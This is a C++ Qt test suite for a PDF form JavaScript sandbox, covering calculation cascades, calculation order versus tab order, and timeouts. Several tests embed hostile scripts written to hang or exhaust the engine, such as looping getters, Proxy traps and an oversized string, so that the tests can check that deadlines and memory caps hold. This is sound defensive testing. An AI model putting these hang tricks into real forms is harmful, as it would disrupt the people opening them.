    const qint64 elapsed = clock.elapsed();
    QVERIFY(!next.ok);
    QCOMPARE(next.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(next.message.contains(QLatin1String("deadline")));
    QVERIFY(next.message.contains(QLatin1String("event setup")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("setup hook took %1 ms").arg(elapsed)));
}

void TestFormJsCalc::sandboxCoercionHookTerminates()
{
    // Result serialization coerces event.value through String() → a looping
    // toString ran unbounded in the -1 deadline gap.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    const auto r = sandbox.runEvent(
        QStringLiteral("event.value = { toString: function () { while (true) {} } };"),
        QStringLiteral("coerce"), QStringLiteral("Calculate"), QStringLiteral("0"), 100);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(r.message.contains(QLatin1String("deadline")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("toString hook took %1 ms").arg(elapsed)));
}

void TestFormJsCalc::sandboxSerializationHookTerminates()
{
    // JSON.stringify serializes the log array: a toJSON hook on a log entry
    // ran unbounded during result serialization.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    const auto r = sandbox.runEvent(
        QStringLiteral("globalThis.__gpLog.push({ toJSON: function () { while (true) {} } }); event.value = 42;"),
        QStringLiteral("tojson"), QStringLiteral("Calculate"), QStringLiteral("0"), 100);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(r.message.contains(QLatin1String("deadline")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("toJSON hook took %1 ms").arg(elapsed)));
}

void TestFormJsCalc::sandboxProxyTrapLoopTerminates()
{
    // A Proxy with a looping get trap in place of the event object — every
    // property the end-event helper reads spins.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    const auto r = sandbox.runEvent(
        QStringLiteral("globalThis.event = new Proxy({ value: 1 }, { get() { while (true) {} } });"),
        QStringLiteral("proxy"), QStringLiteral("Calculate"), QStringLiteral("0"), 100);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(r.message.contains(QLatin1String("deadline")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("proxy trap took %1 ms").arg(elapsed)));
}

void TestFormJsCalc::sandboxExceptionGetterTerminates()
{
    // Exception inspection reads name/message/stack of a thrown Error —
    // hostile getters on those properties must hit the deadline too. The
    // evalHelper entry (used by host glue and the clock seam) had NO deadline
    // at all before the fix: this exact script hung forever.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    QString err;
    const bool ok = sandbox.evalHelper(
        QStringLiteral("(function () { const e = new Error('boom');"
                       " Object.defineProperty(e, 'name', { get() { while (true) {} } });"
                       " throw e; })()"),
        nullptr, &err);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!ok);
    QVERIFY(err.contains(QLatin1String("deadline")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("exception getter took %1 ms").arg(elapsed)));

    // Same boundary through runEvent — the classification must stay an honest
    // Timeout naming the phase, never a mangled exception report.
    const auto r = sandbox.runEvent(
        QStringLiteral("const e = new Error('x');"
                       " Object.defineProperty(e, 'message', { get() { while (true) {} } });"
                       " throw e;"),
        QStringLiteral("excgetter"), QStringLiteral("Calculate"), QString(), 100);
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
    QVERIFY(r.message.contains(QLatin1String("deadline")));
}

void TestFormJsCalc::sandboxHostTransferCapRefusesGiantResult()
{
    // The JS heap cap never bounds HOST memory: a value that fits the 16 MiB
    // engine heap is refused at the 4 MiB host transfer cap instead of being
    // re-materialized several-fold (CString → QString → UTF-8 → JSON).
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    QElapsedTimer clock;
    clock.start();
    const auto r = sandbox.runEvent(
        QStringLiteral("event.value = 'A'.repeat(5 * 1024 * 1024);"),
        QStringLiteral("egress"), QStringLiteral("Calculate"), QStringLiteral("0"), 250);
    const qint64 elapsed = clock.elapsed();
    QVERIFY(!r.ok);
    QCOMPARE(r.kind, gp::formjs::JsErrorKind::Memory);
    QVERIFY(r.message.contains(QLatin1String("transfer cap")));
    QVERIFY2(elapsed < 5000, qPrintable(QStringLiteral("giant result took %1 ms").arg(elapsed)));

    // The input side is capped too: an oversized script text is refused
    // before it is re-encoded (toUtf8) for the engine.
    const QString huge(5 * 1024 * 1024 + 16, QLatin1Char(' '));
    const auto big = sandbox.runEvent(huge, QStringLiteral("big"),
                                      QStringLiteral("Calculate"), QString(), 250);
    QVERIFY(!big.ok);
    QCOMPARE(big.kind, gp::formjs::JsErrorKind::Memory);
    QVERIFY(big.message.contains(QLatin1String("maximum")));
}

void TestFormJsCalc::repeatedTimeoutsLeaveSandboxUsable()
{
    // Three consecutive whole-operation timeouts on the SAME runtime — then a
    // script that repairs the hook must compute again: repeated timeouts must
    // never wedge the engine or the program.
    FormJsSandbox sandbox;
    QVERIFY(sandbox.installShim(nullptr));
    for (int i = 0; i < 3; ++i) {
        QElapsedTimer clock;
        clock.start();
        const auto r = sandbox.runEvent(
            QStringLiteral("globalThis.__gpEndEvent = function () { while (true) {} }; event.value = %1;").arg(i),
            QStringLiteral("spin"), QStringLiteral("Calculate"), QStringLiteral("0"), 100);
        QVERIFY(!r.ok);
        QCOMPARE(r.kind, gp::formjs::JsErrorKind::Timeout);
        QVERIFY2(clock.elapsed() < 5000, qPrintable(QStringLiteral("timeout %1 took %2 ms").arg(i).arg(clock.elapsed())));
    }
    // A later event repairs the helper and computes honestly — no wedged state.
    sandbox.setFieldValues({ { QStringLiteral("a"), QStringLiteral("2") } });
    const auto good = sandbox.runEvent(
        QStringLiteral("globalThis.__gpEndEvent = function () { return JSON.stringify({ hasValue: true,"
                       " value: globalThis.event.value, rc: true, logs: [], blocked: [] }); };"
                       " event.value = 42;"),
        QStringLiteral("recovered"), QStringLiteral("Calculate"), QStringLiteral("0"), 250);
    QVERIFY2(good.ok, qPrintable(good.message));
    QCOMPARE(good.value, QStringLiteral("42"));

    // And a FRESH sandbox (what every new cascade builds) is unaffected.
    FormJsSandbox fresh;
    QVERIFY(fresh.installShim(nullptr));
    const auto freshRun = fresh.runEvent(QStringLiteral("event.value = 7;"),
                                         QStringLiteral("fresh"), QStringLiteral("Calculate"),
                                         QStringLiteral("0"), 250);
    QVERIFY2(freshRun.ok, qPrintable(freshRun.message));
    QCOMPARE(freshRun.value, QStringLiteral("7"));
}

void TestFormJsCalc::endEventTimeoutKeepsValueAndDisclosesSkipped()
{
    // The reproduced bypass at the transaction level: a /CO blocker replaces
    // __gpEndEvent with a loop. The user's value must still commit, the
    // blocker keeps its committed value, and every calculated field the
    // aborted cascade never reached is NAMED as potentially stale.
    const QString form = makeFormPdf(QStringLiteral("order-endhook.pdf"),
    {
        { QStringLiteral("qty1"), {}, {}, {} },
        { QStringLiteral("blocker"),
          QStringLiteral("globalThis.__gpEndEvent = function () { while (true) {} }; event.value = 'x';"), {}, {} },
        { QStringLiteral("total"),
          QStringLiteral("AFSimple_Calculate('SUM', new Array('qty1'));"), {}, QStringLiteral("0") },
    },
    { QStringLiteral("blocker"), QStringLiteral("total") });
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/order-endhook-out.pdf");

    QElapsedTimer clock;
    clock.start();
    QList<FormJsFailure> failures;
    QVERIFY(fillAndFill(form, { { QStringLiteral("qty1"), QStringLiteral("5") } }, out, &failures));
    QVERIFY2(clock.elapsed() < 15000, qPrintable(QStringLiteral("cascade took %1 ms").arg(clock.elapsed())));

    // Honest, field-attributed outcomes: the blocker timed out; total was
    // skipped and disclosed as potentially stale.
    QStringList kinds;
    for (const auto& f : failures) kinds << f.fieldName + QLatin1Char(':') + f.kind;
    QVERIFY2(kinds.contains(QStringLiteral("blocker:timeout")), qPrintable(kinds.join(QStringLiteral(", "))));
    QVERIFY2(kinds.contains(QStringLiteral("total:skipped")), qPrintable(kinds.join(QStringLiteral(", "))));
    for (const auto& f : failures) {
        if (f.kind == QLatin1String("skipped"))
            QVERIFY(f.reason.contains(QLatin1String("stale")));
    }

    // R01 transaction policy: the user's value committed; the skipped field
    // kept its stored value (0) — never a wrong computed value.
    QCOMPARE(pdfFieldValue(out, QStringLiteral("qty1")), QStringLiteral("5"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("blocker")), QString());
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QStringLiteral("0"));
}

void TestFormJsCalc::orderFormCascadePersistsThroughSave()
{
    const QString form = makeOrderForm(QStringLiteral("order-form.pdf"));
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/order-filled.pdf");

    QList<FormJsFailure> failures;
    QVERIFY(fillAndFill(form, {
        { QStringLiteral("qty1"), QStringLiteral("2") },
        { QStringLiteral("price1"), QStringLiteral("3.5") },
        { QStringLiteral("qty2"), QStringLiteral("1") },
        { QStringLiteral("price2"), QStringLiteral("4") },
    }, out, &failures));
    QVERIFY2(failures.isEmpty(), qPrintable(failureNames(failures).join(QStringLiteral(", "))));

    // Read path 1: fresh PoDoFo load of the committed file.
    QCOMPARE(pdfFieldValue(out, QStringLiteral("line1")), QStringLiteral("7"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("line2")), QStringLiteral("4"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QStringLiteral("11"));
    // Read path 2: qpdf's independent parser — the values are real PDF data.
    QCOMPARE(qpdfFieldValue(out, QStringLiteral("line1")), QStringLiteral("7"));
    QCOMPARE(qpdfFieldValue(out, QStringLiteral("line2")), QStringLiteral("4"));
    QCOMPARE(qpdfFieldValue(out, QStringLiteral("total")), QStringLiteral("11"));
}

void TestFormJsCalc::cascadeRecomputesWhenLineItemChanges()
{
    const QString form = makeOrderForm(QStringLiteral("order-cascade.pdf"));
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/order-cascade-out.pdf");
    QVERIFY(fillAndFill(form, {
        { QStringLiteral("qty1"), QStringLiteral("2") },
        { QStringLiteral("price1"), QStringLiteral("3.5") },
        { QStringLiteral("qty2"), QStringLiteral("1") },
        { QStringLiteral("price2"), QStringLiteral("4") },
    }, out));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QStringLiteral("11"));

    // Change ONE line item on the FILLED file: line1 AND total recompute.
    const QString out2 = m_dir.path() + QStringLiteral("/order-cascade-out2.pdf");
    QVERIFY(fillAndFill(out, { { QStringLiteral("qty1"), QStringLiteral("3") } }, out2));
    QCOMPARE(pdfFieldValue(out2, QStringLiteral("line1")), QStringLiteral("10.5"));
    QCOMPARE(pdfFieldValue(out2, QStringLiteral("total")), QStringLiteral("14.5"));
    QCOMPARE(qpdfFieldValue(out2, QStringLiteral("total")), QStringLiteral("14.5"));
    // line2 untouched: 1 × 4
    QCOMPARE(pdfFieldValue(out2, QStringLiteral("line2")), QStringLiteral("4"));
}

void TestFormJsCalc::formatIsDisplayOnlyAndNeverWritesV()
{
    const QString form = makeOrderForm(QStringLiteral("order-format.pdf"));
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/order-format-out.pdf");
    QVERIFY(fillAndFill(form, {
        { QStringLiteral("qty1"), QStringLiteral("2") },
        { QStringLiteral("price1"), QStringLiteral("3.5") },
        { QStringLiteral("qty2"), QStringLiteral("1") },
        { QStringLiteral("price2"), QStringLiteral("4") },
    }, out));

    // Display pass: the /AA /F script formats the total as currency…
    FormManager fm;
    QCOMPARE(fm.formatFieldValue(out, QStringLiteral("total")),
             QStringLiteral("$11.00"));
    // …but the STORED value is untouched by formatting (Acrobat semantics:
    // formatting changes presentation, never /V).
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QStringLiteral("11"));

    // Inspection probes used by the fill UI badge
    QVERIFY(fm.fieldHasCalculateScript(out, QStringLiteral("total")));
    QVERIFY(fm.fieldHasFormatScript(out, QStringLiteral("total")));
    QVERIFY(!fm.fieldHasCalculateScript(out, QStringLiteral("qty1")));
    QVERIFY(!fm.fieldHasFormatScript(out, QStringLiteral("qty1")));
}

void TestFormJsCalc::syntaxErrorKeepsCommittedValueAndOthersCalculate()
{
    // line1's script is broken; line2 and total must still calculate, and the
    // failure must NAME line1 with its classification.
    const QString form = makeFormPdf(QStringLiteral("order-syntax.pdf"),
    {
        { QStringLiteral("qty1"), {}, {}, {} },
        { QStringLiteral("price1"), {}, {}, {} },
        { QStringLiteral("qty2"), {}, {}, {} },
        { QStringLiteral("price2"), {}, {}, {} },
        { QStringLiteral("line1"), QStringLiteral("AFSimple_Calculate('PROD'"), {}, {} }, // syntax error
        { QStringLiteral("line2"),
          QStringLiteral("AFSimple_Calculate('PROD', new Array('qty2','price2'));"), {}, {} },
        { QStringLiteral("total"),
          QStringLiteral("AFSimple_Calculate('SUM', new Array('line1','line2'));"), {}, {} },
    },
    { QStringLiteral("line1"), QStringLiteral("line2"), QStringLiteral("total") });
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/order-syntax-out.pdf");

    QList<FormJsFailure> failures;
    QVERIFY(fillAndFill(form, {
        { QStringLiteral("qty1"), QStringLiteral("9") },
        { QStringLiteral("price1"), QStringLiteral("9") },
        { QStringLiteral("qty2"), QStringLiteral("1") },
        { QStringLiteral("price2"), QStringLiteral("4") },
    }, out, &failures));

    QCOMPARE(failures.size(), 1);
    QCOMPARE(failures.first().fieldName, QStringLiteral("line1"));
    QCOMPARE(failures.first().kind, QStringLiteral("syntax"));
    QVERIFY(!failures.first().reason.isEmpty());

    // line1 keeps its committed value; the rest compute on it ("" counts as 0).
    QCOMPARE(pdfFieldValue(out, QStringLiteral("line1")), QString());
    QCOMPARE(pdfFieldValue(out, QStringLiteral("line2")), QStringLiteral("4"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QStringLiteral("4"));
}

void TestFormJsCalc::infiniteLoopKeepsValueAndSaveProceeds()
{
    const QString form = makeFormPdf(QStringLiteral("order-loop.pdf"),
    {
        { QStringLiteral("qty1"), {}, {}, {} },
        { QStringLiteral("total"), QStringLiteral("while (true) {}"), {}, QStringLiteral("99") },
    },
    { QStringLiteral("total") });
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/order-loop-out.pdf");

    QElapsedTimer clock;
    clock.start();
    QList<FormJsFailure> failures;
    QVERIFY(fillAndFill(form, { { QStringLiteral("qty1"), QStringLiteral("5") } }, out, &failures));
    const qint64 elapsed = clock.elapsed();

    // Honest failure, attributed to the right field, bounded in time.
    QCOMPARE(failures.size(), 1);
    QCOMPARE(failures.first().fieldName, QStringLiteral("total"));
    QCOMPARE(failures.first().kind, QStringLiteral("timeout"));
    QVERIFY(failures.first().reason.contains(QLatin1String("deadline")));
    QVERIFY2(elapsed < 10000, qPrintable(QStringLiteral("cascade took %1 ms").arg(elapsed)));

    // R01 + honesty: the user's value still committed; the calculated field
    // kept its committed value (99), it did not become a wrong value.
    QCOMPARE(pdfFieldValue(out, QStringLiteral("qty1")), QStringLiteral("5"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QStringLiteral("99"));
}

void TestFormJsCalc::cyclicCalculationOrderTerminates()
{
    // Malformed /CO with a duplicate entry (cycle) — must terminate and
    // calculate each field exactly once.
    const QString form = makeFormPdf(QStringLiteral("cyclic-co.pdf"),
    {
        { QStringLiteral("a"), QStringLiteral("event.value = 1;"), {}, {} },
        { QStringLiteral("b"), QStringLiteral("AFSimple_Calculate('SUM', new Array('a'));"), {}, {} },
    },
    { QStringLiteral("a"), QStringLiteral("b"), QStringLiteral("a") }); // cycle
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/cyclic-co-out.pdf");

    QList<FormJsFailure> failures;
    QElapsedTimer clock;
    clock.start();
    QVERIFY(fillAndFill(form, {}, out, &failures));
    QVERIFY2(clock.elapsed() < 5000, "cyclic /CO must not spin the cascade");
    QCOMPARE(pdfFieldValue(out, QStringLiteral("a")), QStringLiteral("1"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("b")), QStringLiteral("1"));
    // No duplicate-calculation failures: b computed once from a's final value.
    QVERIFY(failures.isEmpty());
}

void TestFormJsCalc::revertVerifyDisabledExecutionIsPreFixState()
{
    // THE REVERT-VERIFY: with execution disabled, the cascade test's core
    // assertion FAILS — this suite detects the pre-fix (disclosure) behavior.
    const QString form = makeOrderForm(QStringLiteral("order-revert.pdf"));
    QVERIFY(!form.isEmpty());
    const QString out = m_dir.path() + QStringLiteral("/order-revert-out.pdf");

    FormJsRunner::setExecutionGloballyEnabled(false);
    QList<FormJsFailure> failures;
    const bool ok = fillAndFill(form, {
        { QStringLiteral("qty1"), QStringLiteral("2") },
        { QStringLiteral("price1"), QStringLiteral("3.5") },
        { QStringLiteral("qty2"), QStringLiteral("1") },
        { QStringLiteral("price2"), QStringLiteral("4") },
    }, out, &failures);
    FormJsRunner::setExecutionGloballyEnabled(true); // never leak the kill-switch
    QVERIFY(ok);
    QVERIFY(failures.isEmpty()); // nothing ran → nothing failed → SILENT staleness

    // The pre-fix behavior: computed fields hold their stored (empty) value.
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QString());
    // If the next two asserts ever succeed, the revert-verify contract broke:
    QVERIFY(pdfFieldValue(out, QStringLiteral("total")) != QStringLiteral("11"));
    QVERIFY(pdfFieldValue(out, QStringLiteral("line1")) != QStringLiteral("7"));
}

void TestFormJsCalc::capabilityRegistryDisclosesFormJavaScript()
{
    gp::CapabilityRegistry registry;
    registry.registerEngineProbes();
    const gp::Capability c = registry.query(gp::CapId::FormJavaScript);
#ifdef HAS_QUICKJS
    QCOMPARE(c.status, gp::Availability::Available);
    QVERIFY(c.detail.contains(QLatin1String("quickjs-ng")));
    QVERIFY(c.detail.contains(QLatin1String("16 MiB")));
#else
    QCOMPARE(c.status, gp::Availability::UnavailableBuild);
    QVERIFY(!c.whyNot.isEmpty());
    QVERIFY(!c.alternative.isEmpty());
#endif
}

// ── R18(b): keyboard tab order vs calculation order ─────────────────────────

void TestFormJsCalc::tabOrderReordersWidgetsButNeverTouchesCalculationOrder()
{
    // A real form where the two orders DIFFER: the author's /CO dependency
    // order is line1 → line2 → total, while the user re-orders TABS as
    // total → qty1 → line2. After the tab-order edit:
    //   * the page's widget annotations carry the requested tab order
    //     (declared as PDF 2.0 /Tabs /W — widget order);
    //   * /CO is EXACTLY what the author wrote — a tab edit may never change
    //     WHEN dependent fields recompute;
    //   * and the cascade still computes correctly on the edited document
    //     (the old implementation overwrote /CO with the tab order, which made
    //     `total` compute FIRST, on stale line items).
    const QString form = makeOrderForm(QStringLiteral("order-tab-vs-co.pdf"));
    QVERIFY(!form.isEmpty());

    const QStringList tabRequest = {
        QStringLiteral("total"), QStringLiteral("qty1"), QStringLiteral("line2")
    };
    FormManager fm;
    QVERIFY(fm.setTabOrder(form, tabRequest, form));

    // Tab order: the requested widgets occupy the front of page 0's /Annots in
    // request order (everything else keeps its original relative order behind
    // them), declared as /Tabs /W on this previously-undeclared page.
    const QStringList annots = page0AnnotNameSequence(form);
    QCOMPARE(annots.mid(0, tabRequest.size()), tabRequest);
    QCOMPARE(page0TabsValue(form), QStringLiteral("W"));

    // Calculation order: untouched.
    QCOMPARE(coNameSequenceOf(form),
             (QStringList{ QStringLiteral("line1"), QStringLiteral("line2"), QStringLiteral("total") }));

    // The cascade on the tab-reordered document still computes in /CO order:
    // total == (5×2) + (3×4) = 22, never a stale value computed before its
    // dependencies.
    const QString out = m_dir.path() + QStringLiteral("/order-tab-vs-co-out.pdf");
    QList<FormJsFailure> failures;
    QVERIFY(fillAndFill(form,
                        { { QStringLiteral("qty1"), QStringLiteral("5") },
                          { QStringLiteral("price1"), QStringLiteral("2") },
                          { QStringLiteral("qty2"), QStringLiteral("3") },
                          { QStringLiteral("price2"), QStringLiteral("4") } },
                        out, &failures));
    QVERIFY2(failures.isEmpty(), qPrintable(failureNames(failures).join(QStringLiteral(", "))));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("line1")), QStringLiteral("10"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("line2")), QStringLiteral("12"));
    QCOMPARE(pdfFieldValue(out, QStringLiteral("total")), QStringLiteral("22"));

    // And the saved artifact's own /CO still reads line1 → line2 → total via
    // the independent qpdf parser (second read path).
    QCOMPARE(qpdfFieldValue(out, QStringLiteral("total")), QStringLiteral("22"));
}

void TestFormJsCalc::tabOrderRespectsAuthorTabsDeclaration()
{
    // A page whose author already declared a tab order (/S structure order —
    // e.g. an accessibility-authored document) keeps that declaration: the
    // widget reorder lands in /Annots, but /Tabs is NEVER overwritten.
    const QString base = makeOrderForm(QStringLiteral("order-tabs-declared-base.pdf"));
    QVERIFY(!base.isEmpty());
    const QString form = withTabsDeclaration(base,
        m_dir.path() + QStringLiteral("/order-tabs-declared.pdf"), "S");
    QVERIFY(!form.isEmpty());

    FormManager fm;
    QVERIFY(fm.setTabOrder(form, { QStringLiteral("total"), QStringLiteral("qty1") }, form));

    // Widgets reordered, author's /Tabs preserved, /CO untouched.
    const QStringList annots = page0AnnotNameSequence(form);
    QCOMPARE(annots.mid(0, 2), (QStringList{ QStringLiteral("total"), QStringLiteral("qty1") }));
    QCOMPARE(page0TabsValue(form), QStringLiteral("S"));
    QCOMPARE(coNameSequenceOf(form),
             (QStringList{ QStringLiteral("line1"), QStringLiteral("line2"), QStringLiteral("total") }));
}

void TestFormJsCalc::tabOrderWithNoMatchingFieldIsRefusedAndKeepsBytes()
{
    // An operation that would match no field is a silent no-op in the making:
    // it must be REFUSED before any byte changes (the old implementation
    // "succeeded" while rewriting /CO to a degenerate order).
    const QString form = makeOrderForm(QStringLiteral("order-refused.pdf"));
    QVERIFY(!form.isEmpty());
    const QString bytesBefore = sha256OfFile(form);

    FormManager fm;
    QVERIFY2(!fm.setTabOrder(form, { QStringLiteral("no_such_field") }, form),
             "a tab-order request matching no field must be refused");
    QCOMPARE(sha256OfFile(form), bytesBefore);
    // Nothing about the document's orders changed.
    QCOMPARE(coNameSequenceOf(form),
             (QStringList{ QStringLiteral("line1"), QStringLiteral("line2"), QStringLiteral("total") }));
    QCOMPARE(page0TabsValue(form), QString());
}

// ── R18(d): runtime closure after an aborted cascade ────────────────────────

void TestFormJsCalc::abortedCascadeDiscardsRuntimeNoStateBleedsIntoNextRun()
{
    // Cascade 1 runs on a document whose /AA /C script replaces the shim's
    // end-event helper with an infinite loop: the whole-operation deadline
    // aborts the cascade (user value commits, downstream disclosed). The
    // runner builds ONE runtime per operation and discards it — the NEXT
    // operation must therefore behave as a clean room:
    //   * a subsequent cascade on a clean document computes fully (no leaked
    //     hostile helper, no leaked logs/blocked audit entries);
    //   * a format evaluation (fresh sandbox by contract) still works.
    // If a future change hoists the sandbox into shared/session state, the
    // leaked loop helper times out every event below and this test fails.
    const QString hostile = makeFormPdf(QStringLiteral("closure-hostile.pdf"),
    {
        { QStringLiteral("qty1"), {}, {}, {} },
        { QStringLiteral("blocker"),
          QStringLiteral("globalThis.__gpEndEvent = function () { while (true) {} }; event.value = 'x';"), {}, {} },
        { QStringLiteral("fmt"),
          {}, QStringLiteral("AFNumber_Format(2, 0, 0, 0, \"$\", true);"), QStringLiteral("1234.5") },
    },
    { QStringLiteral("blocker") });
    QVERIFY(!hostile.isEmpty());

    const QString hostileOut = m_dir.path() + QStringLiteral("/closure-hostile-out.pdf");
    QList<FormJsFailure> first;
    QVERIFY(fillAndFill(hostile, { { QStringLiteral("qty1"), QStringLiteral("1") } }, hostileOut, &first));
    QVERIFY2(first.count() >= 1, "the hostile cascade must abort with disclosed failures");

    // Cascade 2 — a CLEAN document through the same runner must compute fully.
    const QString clean = makeOrderForm(QStringLiteral("closure-clean.pdf"));
    QVERIFY(!clean.isEmpty());
    const QString cleanOut = m_dir.path() + QStringLiteral("/closure-clean-out.pdf");
    QList<FormJsFailure> second;
    QVERIFY(fillAndFill(clean,
                        { { QStringLiteral("qty1"), QStringLiteral("5") },
                          { QStringLiteral("price1"), QStringLiteral("2") },
                          { QStringLiteral("qty2"), QStringLiteral("3") },
                          { QStringLiteral("price2"), QStringLiteral("4") } },
                        cleanOut, &second));
    QVERIFY2(second.isEmpty(), qPrintable(failureNames(second).join(QStringLiteral(", "))));
    QCOMPARE(pdfFieldValue(cleanOut, QStringLiteral("total")), QStringLiteral("22"));
    QCOMPARE(qpdfFieldValue(cleanOut, QStringLiteral("total")), QStringLiteral("22"));

    // Format evaluation after the aborted cascade — fresh sandbox, correct
    // display value, no hostile-hook interference.
    FormManager fm2;
    const QString formatted = fm2.formatFieldValue(hostileOut, QStringLiteral("fmt"));
    QCOMPARE(formatted, QStringLiteral("$1,234.50"));
}

QTEST_MAIN(TestFormJsCalc)
#include "TestFormJsCalc.moc"
